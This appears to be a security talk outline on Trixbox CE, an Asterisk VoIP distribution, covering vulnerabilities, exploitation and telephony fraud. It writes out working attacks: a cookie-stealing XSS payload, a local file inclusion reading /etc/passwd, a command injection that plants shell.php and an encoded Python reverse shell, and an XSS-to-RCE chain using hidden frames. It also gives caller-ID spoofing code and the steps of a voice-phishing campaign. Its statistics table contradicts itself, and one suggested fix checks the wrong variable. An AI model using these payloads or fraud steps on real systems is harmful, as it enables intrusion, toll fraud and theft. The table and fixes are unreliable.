### Trixbox CE Vulnerability and Exploitation Overview

#### Download Statistics
- **Source**: [Trixbox CE JSON Statistics](http://sourceforge.net/projects/asteriskathome/files/trixbox%20CE/stats/json?start_date=2010-01-01&end_date=2015-01-01)
- **Additional Stats**: [More Stats](http://sourceforge.net/projects/asteriskathome/files/trixbox%20CE/stats/json?start_date=2010-01-01&end_date=2015-01-01)

#### Vulnerabilities
- **Vendor**: Asterisk
- **CVE Details**: [Asterisk CVEs](http://www.cvedetails.com/vendor/6284/Asterisk.html)
- **Vulnerability Types**:
  - Memory Corruption
  - XSS (Cross-Site Scripting)
  - Directory Traversal
  - HTTP Response Splitting
  - CSRF (Cross-Site Request Forgery)
  - File Inclusion

#### Year-by-Year Vulnerability Breakdown
| Year | DoS | Code Execution | Overflow | SQL Injection | Bypass | Gain Information | Gain Privileges | # of Exploits | # of Vulnerabilities |
|------|-----|----------------|----------|---------------|--------|------------------|-----------------|--------------|----------------------|
| 2007 | 11  | 3              | 3        | 1             | 1      | 1                | 1               | 17           | 28                   |
| 2008 | 8   | 1              | 1        | 1             | 1      | 1                | 1               | 15           | 7                    |
| 2009 | 2   | 1              | 1        | 1             | 1      | 1                | 1               | 3            | 9                    |
| 2010 | 1   | 1              | 1        | 1             | 1      | 1                | 1               | 2            | 1                    |
| 2011 | 1   | 1              | 1        | 1             | 1      | 1                | 1               | 1            | 1                    |
| 2012 | 4   | 2              | 2        | 1             | 1      | 1                | 1               | 6            | 4                    |
| 2013 | 1   | 1              | 2        | 1             | 1      | 1                | 1               | 3            | 1                    |
| Total| 28  | 7              | 9        | 1             | 1      | 4                | 1               | 46           |                      |

#### Exploitation Demos
- **XSS and LFI**: [PacketStorm Security](http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html) by AttackTerrorist
  - **Unauthenticated XSS**:
    - Example: `/user/help/html/index.php?id_nodo="%22onmouseover%3dalert%28%27wow_1337\n%27%2bdocument.cookie%29%3d%22`
    - Translation: `?id_nodo="onmouseover=alert('wow_1337\n'+document.cookie)="`
  - **Local File Inclusion**:
    - Example: `/maint/modules/home/index.php?lang=../../../../../../../../etc/passwd%00`
  - **Other Interesting Files**:
    - Asterisk Configs: `/etc/asterisk/` (e.g., `users.conf`, `voicemail.conf`, `extensions.conf`)
    - Amp Portal Config: `/etc/amportal.conf`
    - Asterisk Logs: `/var/log/asterisk`

- **Authenticated Remote Code Execution**:
  - Goal: Upload `shell.php` and spawn a Netcat shell.
  - Example: 
    - `/maint/modules/home/index.php?lang=1;echo "">shell.php`
    - `/maint/modules/home/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.1.10%22,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27`

- **Remote Exec Shell Demo**:
  - [LFI & XSS by AttackTerrorist](http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html)
  - [SIP Message Injection by Snide](http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html)

- **Putting it All Together**:
  - From XSS (UNAUTH) to RCE (AUTH):
    - Requires information gathering, possibly phishing, hidden frames.
    - Example: `user/help/html/index.php?id_nodo=%22onmouseover%3dwindow.location.replace(window.atob(%27aH...%27))%22`
    - Steps:
      1. Load page with iFrame src.
      2. Use XSS to trigger onmouseover in the frame to load Base64 encoded URL.
      3. Hide the frame.

- **Exploitation Defense**:
  - **Fix for XSS**:
    - `help/html/index.php:44`
    - `$smarty->assign("id_nodo", $_GET['id_nodo']);`
    - `if (in_array($tbLang, array('home', 'meetme', 'etc'))) { $smarty->assign("id_nodo", $_GET['id_nodo']); }`
  - **Fix for LFI**:
    - `/var/www/html/maint/modules/home/index.php:68-72`
    - `$tbLang = $_GET['lang'];`
    - `if (!in_array($tbLang, array('home', 'meetme', 'etc'))) { $tbLang = 'english'; }`
    - `$languageFile = 'language/' . $tbLang . '.php';`
    - `if (file_exists($languageFile)) { include($languageFile); }`
  - **Fix for RCE**:
    - `/var/www/html/maint/modules/home/index.php:68`
    - `$tbLang = $_GET['lang'];`
    - `if (!in_array($tbLang, array('english', 'french', 'etc'))) { $tbLang = 'english'; }`

- **Defense Strategies**:
  - Avoid all-in-one distributions.
  - Regularly update.
  - Custom build only what is needed.
  - Configure properly and disable unused features.
  - Use firewalls and fail2ban.

### Fraud and Abuse

#### What is Fraud and Abuse?
- **No intention to pay**.
- **Causes loss or damage** to others or enables criminal profit.
- **Manipulation** of the telecommunications network for unintended purposes.

#### Historical Context
- **Steve Wozniak and Steve Jobs**: Known for creating blue boxes before Apple.
- **Early Users of Blue Boxes**: Phreaks.
- **Other Popular Boxes**: Red box (used for free long-distance calls).
- **John Draper (Capt. Crunch)**: Known for using a toy whistle to make free phone calls.

#### Modern Fraud Techniques
- **Making Money**:
  - IRSF (International Revenue Share Fraud), traffic pumping schemes enabled by cracked PBX.
  - Call generation, forwarding, voicemail dialout, routing changes to high-cost destinations.
- **Caller ID Spoofing** ("backspoofing").
- **Telephony Denial of Service (TDoS)**: Scripted calls to tie up someoneâ€™s phone.
- **Vishing**: Voice phishing, often robo-dialed.

#### Fraud and Abuse Demo
- **Faked Caller Number**: CNAM lookup displays the name registered to the number.
- **Prank Calls, Social Engineering, Bypassing Voicemail Pins, SWATting**.
- **Asterisk CallerID Setting**:
  - `exten => _1NXXNXXXXXX,n,Set(CALLERID(num)=17045551212)`
  - In `.call` files: `CallerID: 17045551212`

#### Phreakme IVR
- **Configuration**:
  - Set calling number and SIP trunk.
  - Create a phishing recording.
  - Set up a target list.
  - Run a dry-run of the recording.
  - Execute the campaign.

- **Why It Matters**:
  - If you get the VM password, you can:
    - Forward calls to high-cost destinations.
    - Make new calls.
    - Broadcast internal messages.
    - Listen to voicemails (corporate espionage).
  - Collect DOB, SSN, or other numeric info for password reset.
  - Steal credit card information.

#### Fraud and Abuse Defense
- **Credential Cracking Protections**.
- **Block International Destinations**.
- **Disable Call Forwarding**.
- **Restrict Voicemail and Conf Bridge Dialout**.
- **Check Provider Protections**.
- **Set PINs on LD Trunks**.
- **Use TLS & SRTP**.
- **Implement Security and Fraud Management Systems**.

#### Backup
- **Current Foreign NPAs (for U.S.)**:
  - [List of Foreign NPAs](http://www.nanpa.com/reports/area_code_relief_planning.html)

This document provides a comprehensive overview of the vulnerabilities, exploitation, and defense strategies for Trixbox CE, along with insights into fraud and abuse in telecommunication systems.